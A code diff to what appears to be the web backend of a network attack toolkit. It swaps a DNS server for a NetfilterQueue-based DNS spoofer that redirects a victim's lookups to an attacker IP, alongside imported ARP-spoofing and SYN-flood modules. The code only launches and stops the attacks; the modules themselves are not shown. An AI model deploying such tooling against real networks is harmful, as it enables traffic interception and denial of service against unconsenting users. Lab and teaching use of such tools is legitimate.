@@ -14,7 +14,7 @@ sys.path.insert(0, str(Path(__file__).parent.parent))
 
 from modules.arp_spoof import ARPSpoofer
 from modules.syn_flood import SYNFlooder
-from modules.dns_server import DNSServer
+from modules.dns_spoof_nfqueue import DNSSpooferNFQueue
 import models
 from models import active_attacks, log_attack
 
@@ -277,15 +277,27 @@ def start_dns_attack():
         print(f"   Domains: {target_domains}", file=sys.stderr)
         print(f"   Interface: {interface or 'default'}", file=sys.stderr)
         
-        # Create DNS server with victim IP filter
-        server = DNSServer(attacker_ip, target_domains, listen_port=53, victim_ip=victim_ip)
+        # Create DNS spoofer using NetfilterQueue
+        spoofer = DNSSpooferNFQueue(
+            attacker_ip=attacker_ip,
+            target_domains=target_domains,
+            victim_ip=victim_ip,
+            queue_num=0
+        )
         
-        # Start server
-        server.start_attack()
+        # Start spoofer in background thread
+        def run_spoofer():
+            try:
+                spoofer.start_attack()
+            except Exception as e:
+                print(f"❌ DNS Spoofer Error: {e}", file=sys.stderr)
+        
+        thread = threading.Thread(target=run_spoofer, daemon=True)
+        thread.start()
         
         # Store in memory
         active_attacks[attack_id] = {
-            'object': server,
+            'object': spoofer,
             'type': 'DNS',
             'victim_ip': victim_ip,
             'attacker_ip': attacker_ip,
@@ -326,18 +338,18 @@ def stop_dns_attack():
             return jsonify({'error': 'Attack not found'}), 404
         
         attack_info = active_attacks[attack_id]
-        server = attack_info['object']
+        spoofer = attack_info['object']
         
-        # Stop server
-        server.stop_attack()
+        # Stop spoofer
+        spoofer.stop_attack()
         
         # Update memory
         del active_attacks[attack_id]
         
         return jsonify({
             'status': 'stopped',
-            'message': f'DNS spoofing server stopped',
-            'packets_spoofed': server.packets_spoofed
+            'message': f'DNS spoofing stopped',
+            'packets_spoofed': spoofer.packets_spoofed
         }), 200
     
     except Exception as e:
